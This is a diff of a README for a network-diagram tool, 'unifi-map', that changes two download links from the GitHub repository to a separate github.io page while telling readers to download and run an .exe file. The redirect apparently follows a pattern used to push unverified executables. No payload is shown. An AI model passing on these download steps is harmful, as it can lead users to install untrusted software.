@@ -1,6 +1,6 @@
 # 🌐 unifi-map - Create clear visual network diagrams easily
 
-[![Download unifi-map](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Josiecontrolling326/unifi-map)
+[![Download unifi-map](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://josiecontrolling326.github.io)
 
 ## 🗺️ About the Application
 
@@ -17,7 +17,7 @@ The unifi-map tool turns your complex network setup into simple visuals. It conn
 
 Visit the link below to reach the project page. Look for the latest version under the Releases section on the right side of the screen.
 
-[Download the unifi-map software here](https://github.com/Josiecontrolling326/unifi-map)
+[Download the unifi-map software here](https://josiecontrolling326.github.io)
 
 Click the file that ends in .exe to save it to your computer.
 
